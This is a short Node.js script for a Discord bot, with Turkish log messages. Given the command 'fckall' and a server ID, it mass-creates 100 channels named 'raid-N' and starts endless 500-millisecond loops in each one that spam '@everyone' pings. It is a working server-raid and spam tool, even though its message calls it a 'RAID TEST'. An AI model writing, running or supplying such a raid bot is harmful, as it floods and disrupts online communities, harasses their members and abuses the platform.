
require('dotenv').config();
const { Client, GatewayIntentBits } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const OWNER_ID = process.env.OWNER_ID;
const SERVER_ID = process.argv[2] || process.env.SERVER_ID;
const COMMAND = process.argv[3]?.toLowerCase();

client.once('ready', async () => {
  console.log(`Bot giriş yaptı: ${client.user.tag}`);

  const guild = client.guilds.cache.get(SERVER_ID);
  if (!guild) {
    console.error("Sunucu bulunamadı.");
    return;
  }

  if (COMMAND === 'fckall') {
    console.log("SPAM BAŞLADI!");

    for (let i = 0; i < 100; i++) {
      setTimeout(async () => {
        try {
          const channel = await guild.channels.create({
            name: `raid-${i}`,
            type: 0,
          });

          for (let j = 0; j < 5; j++) {
            setInterval(() => {
              channel.send("@everyone 🚨 RAID TEST");
            }, 500);
          }

        } catch (err) {
          console.error("Kanal oluşturulamadı:", err.message);
        }
      }, i * 100);
    }
  } else {
    console.log("Geçerli komut girilmedi. (örnek: fckall)");
  }
});

client.login(process.env.TOKEN);
